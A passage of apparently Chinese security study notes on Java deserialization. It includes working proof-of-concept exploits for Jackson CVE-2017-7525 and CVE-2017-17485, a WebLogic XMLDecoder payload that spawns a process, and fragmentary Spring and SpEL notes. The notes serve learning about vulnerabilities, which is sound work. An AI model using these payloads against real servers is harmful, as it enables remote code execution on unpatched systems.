<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250301104130533.png?raw=true" alt="image-20250301104130533"></p>
<p>这个不加会导致反序列化的时候他序列化&#x2F;反序列化出来的是Sex抽象类，而不是Mysex</p>
<h3 id="三-1"><a href="#三-1" class="headerlink" title="三"></a>三</h3><p><strong>NON_CONCRETE_AND_ARRAYS</strong>除了前面提到的特征外，还支持 Array 类型。</p>
<p>类名变成了 <code>”[L”+类名+”;”</code>，序列化 Object 之后为数组形式，反序列化之后得到<code>[Lcom.mi1k7ea.Hacker;</code></p>
<h3 id="四-1"><a href="#四-1" class="headerlink" title="四"></a>四</h3><p><strong>NON_FINAL</strong></p>
<p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。</p>
<h2 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span><br></pre></td></tr></table></figure>

<h3 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h3><p>普通版</p>
<h3 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h3><p>object属性中多了 <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ，</p>
<h3 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h3><p>即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似</p>
<h3 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h3><p>object 属性中多了 <code>&quot;@type&quot;:&quot;Hacker&quot;</code>，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p>
<h3 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h3><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p><strong>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</strong></p>
<p><strong>在 Jackson 反序列化中，若调用了 <code>enableDefaultTyping()</code> 函数或使用 <code>@JsonTypeInfo</code> 注解指定反序列化得到的类的属性为 <code>JsonTypeInfo.Id.CLASS</code> 或 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>，则会调用该属性的类的构造函数和 setter 方法。</strong></p>
<p><strong>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</strong></p>
<p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p>
<ul>
<li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li>
<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
</ul>
<h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.6 系列 &lt; 2.6.7.1<br>Jackson 2.7 系列 &lt; 2.7.9.1<br>Jackson 2.8 系列 &lt; 2.8.8.1</p>
<p>打的 TemplatesImpl 链，所以要求 JDK 版本是 7u21 或者 8u20</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package jjjjackson.cve1;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line">import javax.xml.bind.DatatypeConverter;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class PoC &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(System.getProperty(&quot;java.version&quot;));</span><br><span class="line">        String exp = readClassStr(&quot;E:\\code\\fj\\fj2\\target\\classes\\jjjjackson\\cve1\\SimpleCalc.class&quot;);</span><br><span class="line">        String jsonInput = aposToQuotes(&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot; +</span><br><span class="line">                &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;+exp+&quot;&#x27;],\n&quot; +</span><br><span class="line">                &quot;&#x27;transletName&#x27;:&#x27;drun1baby&#x27;,\n&quot; +</span><br><span class="line">                &quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot; +</span><br><span class="line">                &quot;&#125;\n&quot; +</span><br><span class="line">                &quot;]\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Test test;</span><br><span class="line">        try &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String aposToQuotes(String json)&#123;</span><br><span class="line">        return json.replace(&quot;&#x27;&quot;,&quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String readClassStr(String cls) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        File file = new File(cls);</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(file);</span><br><span class="line">        byte[] bytes = new byte[(int) file.length()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        String base64Encoded = DatatypeConverter.printBase64Binary(bytes);</span><br><span class="line">        return base64Encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250301140430922.png?raw=true" alt="image-20250301140430922"></p>
<h2 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2<br>Jackson 2.8系列 &lt; 2.8.11<br>Jackson 2.9系列 &lt; 2.9.4</p>
<h4 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package jjjjackson.cve1;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class cve2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line">        //CVE-2017-17485</span><br><span class="line">        String payload = &quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        try &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="spel-xml"><a href="#spel-xml" class="headerlink" title="spel.xml"></a>spel.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;  </span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  </span><br><span class="line">       xsi:schemaLocation=&quot;  </span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;  </span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;  </span><br><span class="line">        &lt;constructor-arg value=&quot;calc&quot; /&gt;  </span><br><span class="line">        &lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;  </span><br><span class="line">    &lt;/bean&gt;  </span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h1 id="yaml反序列化"><a href="#yaml反序列化" class="headerlink" title="yaml反序列化"></a>yaml反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a target="_blank" rel="noopener" href="https://tttang.com/archive/1591/">参考</a></h2><p>反序列化过程中会触发set方法和构造方法。</p>
<h1 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">参考</a></p>
<p>相较于原生的反序列化，Hessian反序列化占用空间更小。</p>
<h1 id="Spring核心"><a href="#Spring核心" class="headerlink" title="Spring核心"></a>Spring核心</h1><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p><strong>控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。</strong></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import DAO.MysqlUserDaoImpl;  </span><br><span class="line">import Service.UserServiceImpl;  </span><br><span class="line">import org.junit.Test;  </span><br><span class="line">import org.springframework.context.ApplicationContext;  </span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">public class TestApplication &#123;  </span><br><span class="line">    @Test  </span><br><span class="line"> public void TestApplication() &#123;  </span><br><span class="line">        // 获取ApplicationContext；拿到Spring容器  </span><br><span class="line"> ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);  </span><br><span class="line">  </span><br><span class="line"> // 需要什么就直接get什么！  </span><br><span class="line"> UserServiceImpl userServiceImpl = (UserServiceImpl) context.getBean(&quot;UserServiceImpl&quot;);  </span><br><span class="line"> userServiceImpl.getUser();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="beans-xml"><a href="#beans-xml" class="headerlink" title="beans.xml"></a>beans.xml</h3><p>有三种方式编写</p>
<h2 id="DI依赖注入"><a href="#DI依赖注入" class="headerlink" title="DI依赖注入"></a>DI依赖注入</h2><p>Set注入</p>
<h2 id="C-P命名空间"><a href="#C-P命名空间" class="headerlink" title="C&#x2F;P命名空间"></a>C&#x2F;P命名空间</h2><p>需要在头文件中加入约束文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--&gt;</span><br><span class="line">&lt;bean id=&quot;user&quot; class=&quot;pojo.User&quot; p:name=&quot;Drunkbaby&quot; p:age=&quot;20&quot; /&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--&gt;</span><br><span class="line">&lt;bean id=&quot;user&quot; class=&quot;com.example.pojo.User&quot; c:name=&quot;Drunkbaby&quot; c:age=&quot;20&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>**bean 就是由 IoC 容器初始化、装配及管理的对象 **</p>
<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server</span><br><span class="line">10.3.6.0, </span><br><span class="line">12.1.3.0,</span><br><span class="line">12.2.1.2 </span><br><span class="line">and 12.2.1.3。</span><br></pre></td></tr></table></figure>

<p>t3伪协议套上cc1链子</p>
<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>绕过由 <code>ServerChannelInputStream</code> 换到了自身的 <code>ReadExternal#InputStream</code></p>
<h2 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h2><p>xmlenocde&#x2F;decode</p>
<h3 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h3><p>Oracle WebLogic Server </p>
<p>10.3.6.0.0,</p>
<p> 12.1.3.0.0, </p>
<p>12.2.1.3.0, </p>
<p>12.2.1.4.0, </p>
<p>14.1.1.0.0。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package xml;</span><br><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class XMLDecoderEvilDemo &#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    FileInputStream file = new FileInputStream(&quot;poc.xml&quot;);</span><br><span class="line">    XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));</span><br><span class="line">    Object result = xmlDecoder.readObject();</span><br><span class="line">    xmlDecoder.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;</span><br><span class="line">            &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;Calc&lt;/string&gt;</span><br><span class="line">            &lt;/void&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">        &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<p>利用processbuilder去实现命令执行</p>
<p>↑相当于执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = new String[1];</span><br><span class="line">cmd[0] = &quot;Calc&quot;;</span><br><span class="line">new ProcessBuilder(cmd).start();</span><br></pre></td></tr></table></figure>

<p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。</p>
<h1 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h1><ul>
<li><code>#&#123;&#125;</code> 就是 SpEL 的定界符，用于指明内容未 SpEL 表达式并执行；</li>
<li><code>$&#123;&#125;</code> 主要用于加载外部属性文件中的值；</li>
</ul>
<p><code>?.</code> 符号会确保左边的表达式不会为 <code>null</code>，如果为 <code>null</code> 的话就不会调用 <code>toUpperCase()</code> 方法了。</p>
<h2 id="Expression-形式的-SpEL-表达式注入"><a href="#Expression-形式的-SpEL-表达式注入" class="headerlink" title="Expression 形式的 SpEL 表达式注入"></a>Expression 形式的 SpEL 表达式注入</h2><ul>
<li><strong>ExpressionParser 接口</strong>：表示解析器，</li>
<li><strong>EvaluationContext 接口</strong>：表示上下文环境，</li>
<li><strong>Expression 接口</strong>：表示表达式对象，</li>
</ul>
<h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
<p>F:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;ser.bin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\ctf-tool\ctf\t\lz\cc\c1\cc1\target\classes\org\example\call.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\\ctf-tool\\ctf\\t\\lz\\cc\\c1\\cc1\\target\\classes\\org\\example\\call.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Drun1baby/JavaSecurityLearning</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b站白日梦组长</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads</span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="pom-xml-1"><a href="#pom-xml-1" class="headerlink" title="pom.xml"></a>pom.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">		 xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">	&lt;parent&gt;</span><br><span class="line">		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">		&lt;version&gt;2.7.11&lt;/version&gt;</span><br><span class="line">		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">	&lt;/parent&gt;</span><br><span class="line">	&lt;groupId&gt;com.example&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;javaGuide&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">	&lt;name&gt;javaGuide&lt;/name&gt;</span><br><span class="line">	&lt;description&gt;javaGuide&lt;/description&gt;</span><br><span class="line">	&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.83&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.nibblesec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;serialkiller&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;0.4&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				